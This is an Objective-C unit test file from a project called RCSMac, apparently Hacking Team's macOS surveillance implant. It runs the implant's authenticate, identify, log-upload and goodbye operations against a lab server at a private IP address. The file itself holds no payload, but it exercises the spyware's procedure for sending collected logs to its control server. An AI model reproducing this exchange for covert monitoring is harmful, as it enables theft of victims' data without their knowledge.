/*
 *  LogNetworkOperationTest.m
 *  RCSMac
 *
 *
 *  Created by revenge on 1/27/11.
 *  Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>
#import <GHUnit/GHUnit.h>

#import "LogNetworkOperation.h"
#import "AuthNetworkOperation.h"
#import "IDNetworkOperation.h"
#import "ByeNetworkOperation.h"
#import "RCSMCommon.h"


static NSURL *mURL                      = nil;
static RESTTransport *mTransport        = nil;
static AuthNetworkOperation *mAuth      = nil;
static IDNetworkOperation *mID          = nil;
static LogNetworkOperation *mLog        = nil;
static ByeNetworkOperation *mBye        = nil;

@interface LogNetworkOperationTest : GHTestCase

@end

@implementation LogNetworkOperationTest

- (BOOL)shouldRunOnMainThread
{
  // By default NO, but if you have a UI test or test dependent on running on the main thread return YES
  return NO;
}

- (void)setUpClass
{
  // Run at start of all tests in the class
  mURL = [[NSURL alloc] initWithString: @"http://192.168.1.153:8080/"];
}

- (void)tearDownClass
{
  // Run at end of all tests in the class
  [mURL release];
}

- (void)setUp
{
  // Run before each test method
  mTransport = [[RESTTransport alloc] initWithURL: mURL
                                           onPort: 8080];
  mAuth  = [[AuthNetworkOperation alloc]
            initWithTransport: mTransport];
  mID    = [[IDNetworkOperation alloc]
            initWithTransport: mTransport];
  mLog   = [[LogNetworkOperation alloc]
            initWithTransport: mTransport];
  mBye   = [[ByeNetworkOperation alloc]
            initWithTransport: mTransport];
}

- (void)tearDown
{
  // Run after each test method
  [mAuth release];
  [mID release];
  [mLog release];
  [mBye release];
  [mTransport release];
}

- (void)testAllocation
{
  RESTTransport *transport = [[RESTTransport alloc] initWithURL: mURL
                                                         onPort: 80];
  
  LogNetworkOperation *logOP = [[LogNetworkOperation alloc]
                                initWithTransport: transport];
  
  GHAssertNotNULL(logOP, nil, @"Error on allocation");
  
  [transport release];
  [logOP release];
}

- (void)testPerform
{
  BOOL result = NO;
  
  result = [mAuth perform];
  GHAssertTrue(result, @"Auth went wrong");
  
  result = [mID perform];
  GHAssertTrue(result, @"idOP went wrong");
  
  result = [mLog perform];
  GHAssertTrue(result, @"LOG went wrong");
  
  result = [mBye perform];
  GHAssertTrue(result, @"Bye went wrong");
}

@end